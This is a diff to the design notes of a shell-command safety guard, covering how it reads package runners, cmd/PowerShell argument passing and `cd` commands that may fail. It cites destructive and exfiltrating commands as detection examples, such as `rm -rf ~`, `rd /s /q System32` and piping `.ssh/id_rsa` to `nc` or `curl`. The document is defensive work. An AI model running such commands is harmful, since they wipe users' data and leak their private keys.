@@ -123,7 +123,11 @@ parsers are tree-sitter's bash, PowerShell and batch grammars.
   `C:shutdown` from that drive's current folder, which for an elevated cmd
   is `C:\Windows\System32`, so it is `shutdown`. Windows drops the dots and
   spaces that end a file's name, and the guard does too
-  (`shutdown.exe. /s` is `shutdown /s`).
+  (`shutdown.exe. /s` is `shutdown /s`). PowerShell runs a program's
+  `.ps1` shim (npm installs `npx.ps1`) by its name, so a program named
+  `X.ps1` there, bare or by a full path, is judged as `X` (`rm.ps1 -r C:\`,
+  `cdk.ps1 destroy`, `C:\nodejs\npx.ps1`); one named by a relative path
+  (`.\scripts\format.ps1`) is the project's own script, and stays that.
   A `/` outside the quotes ends the name (`cmd/c`) unless it follows a
   drive (`C:/Windows/System32/shutdown.exe` is `shutdown`); one after a
   folder in a name with no quotes (`C:\Windows/System32/shutdown.exe`)
@@ -264,6 +268,89 @@ run, and only `--dry-run` is read as one: `del -n ~` deletes as far as the
 guard knows. What a runner starts is a program, never a builtin of the shell,
 so `npx cd src` does not move the rest of the line to `src`.
 
+A runner's table lists the options that take a value; any other option may be
+a flag or take the word after it (a table can miss one, and a runner may
+read an option it does not document), so the program is any word the options
+may leave first, and each is judged: `pipx run --index x rimraf ~` is
+`Delete` whether `--index` takes `x` or not, and `uvx --isolated ruff check .`
+is safe both ways. A word that starts with a dash is never such a value. The
+same holds in front of the runner's subcommand: when the word after the
+options is no subcommand but the one after an option the table does not list
+is, that option takes the word (`micromamba --log-level info run rm -rf ~`,
+`poetry --opt x run …`, `yarn --opt x workspace web exec …`).
+This holds for the runners whose options are a list (`bunx`, `bun x`, `uvx`,
+`uv`, `pipx`, `yarn`, `deno x`, `dx` and the environment runners below);
+npm's and pnpm's options are read by their own parsers. The readings share the
+32 forks a line may make, past which it is unreadable.
+
+The runners of a project's environment start the command after `run` as `uv
+run` does, past their own options before and after `run`: `poetry run` (`-C`,
+`-P`), `pdm run` (`-p`, `-c`, `-L`, `--venv`), `hatch run` (`-e`, `-p`,
+`--data-dir`, …; also `hatch env run [options] [--] CMD`; the matrix
+variables in front of the command, `+py=3.12` and `-py=3.10`, and an
+environment in front of it are taken off, so `hatch run +py=3.12 test:rm -rf
+~` runs `rm`), `conda run`, `mamba run` and `micromamba run` (`-n`, `-p`,
+`--cwd`, `-r`, `--log-level`, …), `pixi run` (`-e`, `--manifest-path`, …) and
+`pixi exec`, read as `uvx` is (`-s`, `-c`, `-p`, …), `pipenv run`
+(`--python`, `--pypi-mirror`), `rye run` (`--pyproject`) and `volta run`
+(`--node`, `--npm`, `--pnpm`, `--yarn`, `--env`). `mise exec` (also `mise x`)
+runs the command after its `--` (the words before it are tools: `mise exec
+node@20 -- rm -rf ~`), and `-c` (`--command`) runs a shell line, its value
+next or joined to it (`-c'cmd'`, `-c=cmd`, `--command=cmd`). `corepack` in front of a
+package manager (`corepack pnpm@9 dlx rimraf ~`, `corepack npx …`) starts it,
+read as the manager is; `corepack enable` and its other commands are its own
+business. `yarn workspace NAME CMD…` runs `yarn CMD…` and `yarn workspaces
+foreach [options] CMD…` runs it in each workspace, so both are read as `yarn
+CMD…` (`yarn workspace web exec rm -rf ~`), and yarn 1's `yarn workspaces run
+NAME` as `yarn run NAME`. `yarn NAME` and `yarn run NAME`, where NAME is no
+command of yarn, run the project's script of that name or else its program,
+so with words after NAME they are read as that program, as `pnpm NAME` is
+(`yarn cdk destroy`, `yarn rimraf dist`; `yarn cdk synth` is safe). A name
+alone is the project's script, not read as a program: `yarn format` in cmd
+and `yarn shutdown` are safe (a delete tool alone, `yarn rimraf`, is still
+read as the tool). `node` is no command of yarn, so `yarn node -e 'code'` is
+`node -e 'code'`. `npm explore PKG -- CMD` (also
+without `--`) runs CMD as a line of the system shell, and `deno task --eval
+'cmd'` its words as a line of deno's own shell, read as POSIX.
+
+Packages that run a command are read the same way, whether a runner starts
+them or not: `shx` runs a command of the `shelljs` package by its name (`shx
+rm -rf ~` is `rm -rf ~`), `cross-env` the command after its `NAME=value`
+words (each of which it sets, as `env` does), `dotenv` the command after its
+options or `--`.
+`cross-env-shell` runs its words after the assignments as a shell line,
+`concurrently` each of its arguments and its `--teardown`, with its shortcuts
+spelt out (`npm:dev` is `npm run dev`), and `npm-run-all`, `run-s` and `run-p`
+each of theirs: each line is read, the riskiest counts, and a word after an
+option they do not list is read as a line too. With `-P`
+(`--passthrough-arguments`) the words after concurrently's `--` are no lines:
+they fill in the placeholders of its lines, `{1}` the first, `{@}` each and
+`{*}` all as one, each quoted for the shell as concurrently quotes it (a `~`
+stays as it is), so `concurrently -P 'rm -rf {1}' -- ~` runs `rm -rf ~`.
+`npm-run-all` runs `npm run` with each argument: a name alone (`format`,
+`reboot`) or a first word with a wildcard (`watch:*`) names the project's
+scripts and is read as `npm run NAME`; a line with words after its first
+(`'rimraf ~'`) is read as the program it names too.
+
+A package that installs its program under another name is judged as that
+program: `aws-cdk` is `cdk`, `cdktf-cli` is `cdktf`, `firebase-tools` is
+`firebase`, `awscli` is `aws`, `azure-cli` is `az`, `dotenv-cli` is `dotenv`
+and `npm-run-all2` is `npm-run-all` (`npx -y aws-cdk@2 destroy --all` is
+`destroy_resources`). A Python runner (`uvx`, `uv`, `pipx`)
+takes a version specifier or extras off the package as `@version` is taken
+off for npm (`uvx rimraf==1.0 ~`, `pipx run 'black[jupyter]'`). The command
+`npx` and `npm exec` run in place of a program is also the `npm_config_call`
+the line sets where they run (npm reads the name in any case, so
+`NPM_CONFIG_CALL` too), read as `-c` is: a prefix assignment, `env`, an
+assignment or `export` earlier in the line, PowerShell's `$env:` and cmd's
+`set`; a value only known when it runs is `unknown`. The line sets the value
+once and may run it many times (`npx; npx; …`), each a reading of the whole
+value, so those readings are bounded by the longest line (64 KiB), as they
+would be had the line written the command out each time; past it, the line
+is unreadable. `bun run -e`, `--eval`, `-p` and `--print` are `bun -e` and
+the rest, also with the code joined to the option (`--eval='code'`), their
+code read as such but not read whole, since `bun run` loads `.env` first.
+
 `bun` and `deno` are interpreters. The code given to `bun -e`, `--eval`, `-p`,
 `--print` (also in a bundle, `bun -pe 'code'`, or with the code attached, `bun
 -e'code'`) and `deno eval` is read and judged like the code of `node -e` (see
@@ -271,9 +358,10 @@ so `npx cd src` does not move the rest of the line to `src`.
 comes back as `Unknown`. `bun repl`, `deno repl`, a bare `deno` and a script
 read from the input (`bun run -`, `deno run -`, `uv run -`) run code the guard
 does not read: `Unknown`, or `RunDownloaded` after a download; in cmd and
-PowerShell lines a REPL reads its input only when something is piped into it
-(`echo x | deno`), and in cmd lines so does a script read from the input
-(`type x.js | bun run -`). The options before the
+PowerShell lines a REPL reads its input only when it is handed one, something
+piped into it (`echo x | deno`) or a file redirected onto it (`deno < x.js`),
+and in cmd lines so does a script read from the input (`type x.js | bun run
+-`, `bun run - < x.js`). The options before the
 subcommand are skipped with their values (`bun -d x:1 -e 'code'` is still
 inline code). `bun exec 'script'` runs a shell script, read as POSIX like `sh
 -c`. `bun run file`, `deno run file` and `bun file` are judged like `node
@@ -283,12 +371,12 @@ file.py`, and `uv run --script file`: `uv` runs Python on the file, like
 `python file`. `deno run npm:pkg` runs the package's program like a runner,
 and so do `deno watch npm:pkg` and `deno npm:pkg`: deno's default subcommand
 is `run`. `deno x` and `dx` are package runners, like `bun x`. In cmd lines
-these runner parts of `bun`, `deno` and `dx` are read as in the other shells
-(`bun x rimraf C:\`, `bun run rimraf C:\`, `deno run npm:rimraf C:\`,
-`dx rimraf C:\`); what they read of an interpreter (a script from the input
-that nothing is piped into, `bun exec`) is not, and inline code is `Unknown`
-there, also when the code cannot be told (a loader in front of `-e`, as in
-`bun --import r.js -e "$X"`). `deno -v` and `deno --help=full` only
+`bun`, `deno` and `dx` are read as in the other shells (`bun x rimraf C:\`,
+`bun run rimraf C:\`, `deno run npm:rimraf C:\`, `dx rimraf C:\`, and the
+POSIX script of `bun exec "rm -rf ~"`), but a script from the input that
+nothing is handed to is not, and inline code is `Unknown` there, also when the
+code cannot be told (a loader in front of `-e`, as in `bun --import r.js -e
+"$X"`). `deno -v` and `deno --help=full` only
 print. The options of `deno` that take their value
 only after `=` (`--reload`, `--env-file`) do not take the next word.
 
@@ -438,6 +526,47 @@ rm -f "$1"' _`) runs once for each item it reads, as a loop body runs, so it
 is judged as one: its `$1` and `$@` name a different value each time, only
 known when it runs.
 
+A cmd line reads the shells and interpreters it starts with the same tables
+as the other shells: one that starts a POSIX shell (`bash -c "rm -rf /"`,
+`sh`, `zsh` and the rest, by their name or their path, as
+`C:\msys64\usr\bin\bash.exe`) has its script split in the POSIX grammar,
+and a shell with no script reads its input (`RunInput`), as `cmd` does; a
+shell's `--version` or `--help` prints and runs nothing, in every shell. A
+shell handed an input of its own, a file redirected onto it or something
+piped into it, hands it on to what its script runs: `cmd /c python < x.py`
+and `type x.py | cmd /c python` run `x.py`, which is `Unknown` as `python <
+x.py` is (an interpreter in cmd reads its input when it is handed one, see
+[Inline code](#inline-code)). The null device holds nothing to read, so
+`python < NUL` is handed no input.
+
+cmd does not split a program's arguments: it hands every program it starts,
+all but its own built-in commands, the text after its name as written, with
+the carets outside quotes taken off and the variables put in, and the program
+splits it. So a program started from a cmd line is given the words the C
+runtime makes of that text (see [Splitting](#splitting)): a quote does not
+end a word and `\"` is a quote, so `bash -c "echo \"hi\"; rm -rf ~"` hands
+bash `echo "hi"; rm -rf ~`, a `Delete`, where cmd's own quotes would give
+`echo \hi\; rm -rf ~`. A runner or a wrapper splits its text the same way
+and hands on the words it made (`uv run`, `npx`, `pnpm dlx`, `npm exec`,
+`wsl`, `git submodule foreach`), and `start` hands the program it starts the
+text after its title. A word that holds a variable only known when it runs
+keeps its quotes, so `docker rm -f "%IDS%"` is one name. A shell built on
+Cygwin or MSYS2 also reads single quotes; a script that opens one and does
+not close it in the C runtime's word is unreadable as POSIX, and so risky.
+`cmd` itself is given the text as it is, quotes and all, with cmd's rule for
+the quotes around the command after `/c` (see Splitting), so `cmd /c bash -c
+"rm -rf ~"` runs `bash -c "rm -rf ~"`, not `bash -c rm -rf ~`.
+
+A PowerShell or POSIX line that starts `cmd` hands it one command line made
+of its words, which cmd reads by the same rules. PowerShell puts a word that
+holds white space outside the quotes in it between double quotes and leaves
+the quotes in it as they are (as it does for `cmd.exe` in every mode of
+passing arguments); a POSIX shell on Windows (Cygwin, MSYS2) quotes a word
+with white space or a quote in it and puts a `\` before each quote, as the C
+runtime reads them. So `cmd /c bash -c "rm -rf ~"` from PowerShell or a POSIX
+shell runs `bash -c "rm -rf ~"` too. A word only known when it runs stays one
+where it stands.
+
 A script handed to a shell is split again, in its own grammar: `bash -c`,
 `eval`, `cmd /c`, `powershell -Command`, `Invoke-Expression`, and the command
 `git submodule foreach` runs in each submodule (see Git tags and submodules).
@@ -470,6 +599,7 @@ that finds the edge by measuring it and asserts both sides (see Tests):
 | Pipes, `|` and not `||`, in one POSIX pipeline | 400 | counted before parsing, outside the literals below, double quotes and comments: bash's grammar takes time that grows with the square of the stages of a pipeline that ends in an error (`a|` repeated to the length limit took 20 to 30 s), and a real pipeline of 401 commands is unreadable. A pipeline ends at `;`, `&`, `&&`, `||` and a line break that does not follow a `|`, so a script of 450 `grep x f | wc -l` reads; a list inside brackets or a compound command (`( … )`, `$( … )`, `{ … }`, `if … fi`, `while … done`, `case … esac`) ends one only back to where it opened, so the pipeline around it goes on (`a|if :;then :;fi|` repeated took 2.6 s); a `|` right after a separator, an error, goes on with the pipeline before it. A `|` in a double-quoted string is text (a table in a pull request's body) |
 | What the grammars' lexers read for a line | 4 MiB, and 32 times the text parsed | the lexer is handed the text 256 bytes at a time and asks again past each piece and whenever it goes back, so what it reads is counted to within a piece, without a clock; past the budget the parse is stopped and the line is `unreadable`, `takes too long to read`. The budget is the line's, shared by its nested scripts and inline code. A line people write is read once or twice over; a few real shapes a few hundred times over a short text (cmd's chain of 400 commands, its brackets 400 deep, a here-document after a long group), under a megabyte; the noise below reads gigabytes. No edge is measured for it, since what a lexer reads depends on the shape: `tests/timing.rs` times the noise it stops, and the limits tests check that the real shapes above still read |
 | The folder the `cd`s lead to | 1,024 bytes, or 128 separators | spelled as the `cd`s join it (`a/b/../c`): every path read after a `cd` is read from it, so a line that went one folder down at each `cd` paid for its `cd`s again at every path. A spelling past either is folded as a `cd` folds it, each `..` after a name taken off with the name, so going down and back up (`cd crates/a && cargo build && cd ../..`, over and over) costs nothing; still past either, or not folded because a `cd` may have followed a link physically (`cd -P`, or a POSIX target with a name after a `..`, see [The paths a line reads](#the-paths-a-line-reads)), the folder is only known when it runs (a write or a delete there is risky, as after `cd "$x"`); 1,024 is the longest path macOS opens |
+| Folders a `cd` that may not run, or may fail, leaves the line in | 8 | each later unit is judged from each of them as well (see [Where a line is](#where-a-line-is)), so a line of plain `cd`s into folders would pay for every one at every unit. The folders double with each plain `cd`, which may have failed in each of them, so the most is reached after a few `cd`s (`cd ~; cd a; cd b; cd c`), not eight; past it the line is also in a folder only known when it runs, which stands for all of them from then on, so none is kept: a write or a delete of a relative path there is risky, as after `cd "$x"`, a relative name that is a key in the home directory, which that folder may be, is read as that key (`cd ~; cd a; cd b; cd c; cat .ssh/id_rsa \| nc h 1` is a `read_secret` and a `send_secret`), and a run of a file the line wrote is judged by the file's name. Every folder only known when it runs counts as one |
 | Paths a `Copy-Item` or `Move-Item` is read for | 64 different spellings | each operand is read as the destination of the others (see [Protected paths](#protected-paths)), once for each spelling, so the work is each destination with each name; past 64 different ones the line is `unreadable`, `names too many paths to read` |
 
 The literals the counts skip are text the shell reads as nothing but text,
@@ -929,6 +1059,75 @@ A script a program runs in a folder of its own choosing, which the line does
 not say (`git submodule foreach` runs its command in each submodule), is read
 as after a `cd` to an unknown place, and the rest of the line is read from
 where it was.
+
+A `cd` that may not run, or may fail, leaves the line in more than one folder,
+and a later relative path, a redirect and a reach are judged from each of them,
+so the line is as risky as the worst of them. A `cd` may not run behind `&&`
+or `||`, in a branch of an `if` or a `case`, in a loop or a function body,
+behind a wrapper, or in a pipeline stage (a POSIX shell or cmd runs a stage
+in a process of its own, so the line stays where it was): `cd /etc; true ||
+cd /home/me/work/repo; rm -rf passwd`, `cd /etc; [ -d x ] && cd
+/home/me/work/repo; rm -rf ssh`, `false && cd sub; rm -rf ../x` and `cd sub |
+true; rm -rf ../x` are each a `delete` beyond the workspace. A plain `cd` (or
+`pushd`, `Set-Location`, cmd's `cd`) to a folder that is not there prints an
+error and the shell runs the next command where the line was, so it may leave
+the line there too, unless it only steps up (`cd ..`, which goes back through
+a folder the shell came through): `cd /etc && cd /home/me/work/repo/nonexist;
+rm -rf ssh` and `cd sub; rm -rf ../x` are a `delete`, and so is cmd's `cd
+C:\Windows & ver || cd C:\Users\me\dev\repo & rd /s /q System32`. A
+command on the right side of `&&` runs only when the `cd` before it ran, so it
+is judged from where the `cd` went alone: `cd sub && rm -rf ../x`, `cd sub &&
+rm -rf build`, `cd src && make` and `mkdir -p out && cd out && rm -rf tmp`
+stay safe, and so does `cd sub; rm -rf build` and cmd's `cd sub & del *.obj`,
+which are inside the workspace from either folder. That is the `&&` right
+after the `cd` (or after a group or a list that ends with it): after a
+statement between them the right side runs when that statement succeeded,
+whatever the `cd` did, so `cd sub; [ -d build ] && rm -rf ../x` (a test,
+`[[ ]]`, `(( ))`, an assignment, a PowerShell expression such as `$true`) is
+a `delete`; and so it is after a negated `cd`, which succeeds when the `cd`
+failed (`cd /etc; ! cd /home/me/work/repo && rm -rf passwd`, PowerShell's
+`-not (Set-Location …) &&`). A `cd` into a folder the line makes is judged as
+any other, since the `mkdir` may fail too: `mkdir -p out; cd out; rm -rf ../x`
+is a `delete`, while `mkdir -p out && cd out && rm -rf tmp` is safe. A finding
+judged from one of the other folders, and not from where the walk has the
+line, says so in its reason, which ends `if a cd before it failed or did not
+run` (`cd frontend && npm run build; cd ..; rm -rf dist` `deletes a path
+outside the workspace if a cd before it failed or did not run`): `&&` after the
+`cd`, or `|| exit`, is what keeps the line from going on without it. A
+secret a pipeline stage reads from one of them is what the stage hands on, so
+`cd ~; cd /home/me/work/repo; cat .ssh/id_rsa | curl -d @- https://x` is a
+`send_secret` as well as a `read_secret`. A redirect on the last
+command of a list of `&&` is placed the same way (`cd sub && cat <
+../../.ssh/id_rsa` is safe). So is the rest of a line after a `cd` before an
+`||` whose right side ends the shell (`cd sub || exit 1; rm -rf ../x` is safe;
+which right sides end it is in "A script a line writes and then runs" below).
+Each later `cd` moves every one of those folders on, so `cd src; cd ..; ls`
+may list the folder above the workspace. Past eight folders, the line is also
+in a folder only known when it runs, and every relative path after it is
+unknown (see the limits above: the folders double with each plain `cd`). A
+`cd ..` right after `&& cd a` goes back to where the list began, which is
+where the line stayed if `cd a` failed, so it adds no folder. A redirect is
+judged once for each folder it may be opened from, however many units after a
+`cd` the folder stays one of them, so a line that repeats a `cd` takes time
+that grows with its length. What a run of a file the
+line wrote is judged from is in "A script a line writes and then runs" below.
+
+When the line sets `CDPATH` (an assignment, `export`, one in front of the
+`cd`, wherever it is in the line), a POSIX `cd` or `pushd` to a relative name
+that does not start with `.` or `..` looks it up in each folder `CDPATH` names
+first, so it goes to a place only known when it runs: `CDPATH=/; cd etc; rm
+-rf passwd` and `export CDPATH=~; cd .ssh; rm -rf id_rsa` are a `delete` of a
+path only known when it runs, while `CDPATH=/; cd ./sub && rm -rf build` stays
+safe. However the line sets it counts: `printf -v CDPATH`, `${CDPATH:=…}`,
+zsh's `cdpath[1]=`, `mapfile` and `readarray`, `getopts`, and a nameref
+(`declare -n r=CDPATH`, or one whose name is only known when it runs, which
+may name `CDPATH`). So does bash's `cdable_vars` or zsh's `cdablevars`, which
+the line turns on (`shopt -s cdable_vars`, `setopt CDABLE_VARS`, a word that
+names it however zsh spells it, or an option only known when it runs): `cd x`
+then goes to the folder `$x` holds when there is no folder `x`, so `shopt -s
+cdable_vars; x=/etc; cd x && rm -rf passwd` is a `delete` of a path only known
+when it runs. zsh's `autocd`, which runs a bare folder name as a `cd`, is not
+read.
 A device (`$null`, `NUL`, `NUL:`, `CON`, `/dev/null`) is the same in any folder,
 so it is read as written, before the path is joined to where a `cd` moved:
 `cd $dir; python x.py > $null` writes nothing, while `> out.txt` stays an
@@ -1001,7 +1200,9 @@ count of `cd`s are taken just before that last command, not before the list,
 and the redirect is on that last command only (the key above is read from
 `~`, and a `send_secret` pipe after it finds it). A `cd` before it that may not
 have run (after `||`, or the right side of `&&` or `||`) makes the folder
-uncertain, as for a `cd` above. A pipeline's last stage starts where the
+uncertain, as for a `cd` above, while a plain `cd` that may have failed does
+not when the last command is after the `&&` that follows it: that command
+then does not run. A pipeline's last stage starts where the
 pipeline starts (`cd ~ | { cat; } < .ssh/id_rsa` opens it from the folder the
 line is in). `{ cd sub; cat; } < ../../.ssh/id_rsa` and `while read
 l; do cd sub; done < ../../.ssh/id_rsa` open the same key `cat
@@ -1021,11 +1222,12 @@ script a line writes and then runs" below). `if
 false; then cd sub; else echo x; fi > x.sh; bash x.sh`, `{ echo x; false && cd
 sub; } > x.sh; bash x.sh` and `for i in $l; do cd sub; echo x; done > x.sh; bash
 x.sh` may run the `x.sh` they wrote, when the `cd` did not run, so they are
-`unknown`, as the same `cd` at the top level is; but `{
-cd sub; echo x; } > x.sh; bash x.sh` surely runs `sub/x.sh` and `if true; then cd
-sub; fi > x.sh; bash x.sh` keeps its verdict: an `if` whose condition is `true`
-or `:` alone, with no `elif` or `else`, runs its body, so a `cd` in it is not
-one that may not have run (unless a function of that name is defined, or the
+`unknown`, as the same `cd` at the top level is; so are `{ cd sub; echo x; } >
+x.sh; bash x.sh` and `if true; then cd sub; fi > x.sh; bash x.sh`, whose plain
+`cd` may have failed and left the line where it wrote `x.sh`, while `{ cd sub;
+echo x; } > x.sh && cd sub && bash x.sh` runs `sub/x.sh` and stays safe. An
+`if` whose condition is `true` or `:` alone, with no `elif` or `else`, runs
+its body, so a `cd` in it is not one that may not have run (unless a function of that name is defined, or the
 line has an `alias`, `enable` or `disable`, which can change what the name
 stands for). That is all it changes: for the option, a function definition and
 where a later `cd` starts it is a branch like any other `if`. After such a
@@ -3221,8 +3423,8 @@ Some risks only show when units are read together.
   `make` is in the pipeline), so `cd a && make > log && cd ../b && make > log
   && cd ../c && make > log && cd ../d && make > log && cd .. && ./run` stays
   safe. A file written where the line may already be in more than one folder
-  (after a `cd` that may not have run) is placed only from where the walk has
-  the line, and a later `cd` may bring the folders together again, so the
+  (after a `cd` that may not have run) is judged from each of them (see "Where
+  a line is"), but a later `cd` may bring the folders together again, so the
   guard does not follow which file each folder holds: a later run of a script
   of that file's name, in any folder, is `unknown`. `false && cd s; echo x >
   x.sh; cd /home/me/work/repo; bash x.sh` runs the file it wrote when `cd s`
@@ -3234,28 +3436,29 @@ Some risks only show when units are read together.
   A plain `cd` may fail too: a folder that is not there is an error, and
   POSIX shells, cmd and PowerShell (whose `cd` error does not stop the line,
   whatever `-ErrorAction` says, since a `try` or a `trap` may go on past it)
-  run the next command where the line was. So for a run of a file only, a
-  plain `cd` (`cd`, `pushd`, `Set-Location`, an `if true` body's, one before
-  `&&`), read after the line wrote a file, also leaves the line in every
-  folder it may have been in before it, each moved on by every later `cd`:
-  `echo x > x.sh; cd s; bash x.sh`, `echo x > x.bat & cd s & x.bat` and
-  `'x' > x.ps1; Set-Location s; .\x.ps1` may run the file they wrote and are
-  `unknown`. Nothing else takes the `cd` as one that may have failed: where
-  paths are placed, where a redirect opens and every other check go on from
-  where it moved the line, and a file written after it is placed from there
-  alone. A command on the right side of the `&&` after it runs only when it
-  ran, so the folders it may have stayed in count only after the list (or
-  from an `||` on): `echo x > x.sh; cd s && bash x.sh` stays safe, `echo x >
-  x.sh; cd s && make; bash x.sh` is `unknown`. Before the line writes a file
-  there is nothing to run where it stayed, so `cd build; make; ./app` and
-  `cd s; bash x.sh` stay safe, and a `cd` that only steps up (`cd ..`,
-  `cd ../..`, cmd's `cd..`) goes back through folders the shell came through
-  and is taken as run, so `cd sub; echo x > x.sh; cd ..; ./x.sh` stays safe.
-  Past eight such folders (a chain of `cd`s into folders, each of which may
-  have failed) each file written so far counts as written in every folder by
-  its name, as above: a run of a script of that name is `unknown`, and one of
-  another name (`echo x > log; cd a; cd b; cd c; cd d; cd e; cd f; ./app`)
-  stays safe.
+  run the next command where the line was. So a plain `cd` (`cd`, `pushd`,
+  `Set-Location`, an `if true` body's, one before `&&`) also leaves the line
+  in every folder it may have been in before it, each moved on by every later
+  `cd`, and a run is judged from each: `echo x > x.sh; cd s; bash x.sh`,
+  `echo x > x.bat & cd s & x.bat`, `'x' > x.ps1; Set-Location s; .\x.ps1` and
+  `{ cd s; echo x; } > x.sh; bash x.sh` (the group's redirect is opened
+  before its `cd`) may run the file they wrote and are `unknown`. A file
+  written after it is matched to a run from where the walk has the line, and
+  from where it stayed, by the same folder: each copy of the write is judged
+  where it lands (see "Where a line is"), but only a run from the folder it
+  was written in can be it. A command on the right side of the `&&` after it
+  runs only when it ran, so the folders it may have stayed in count only after
+  the list (or from an `||` on): `echo x > x.sh; cd s && bash x.sh` stays
+  safe, `echo x > x.sh; cd s && make; bash x.sh` is `unknown`. When the line
+  writes no file there is nothing to run where it stayed, so `cd build; make;
+  ./app` and `cd s; bash x.sh` stay safe, and a `cd` that only steps up
+  (`cd ..`, `cd ../..`, cmd's `cd..`) goes back through folders the shell
+  came through and is taken as run, so `cd sub; echo x > x.sh; cd ..; ./x.sh`
+  stays safe. Past eight such folders (a chain of `cd`s into folders, each of
+  which may have failed) each file written so far counts as written in every
+  folder by its name, as above: a run of a script of that name is `unknown`,
+  and one of another name (`echo x > log; cd a; cd b; cd c; cd d; cd e; cd f;
+  ./app`) stays safe.
   An `||` whose right side ends the shell is the exception: in `cd s ||
   exit` the rest of the line runs only when the left side did not fail, so
   the `cd` ran, and so did every `cd` on the right of an `&&` before the
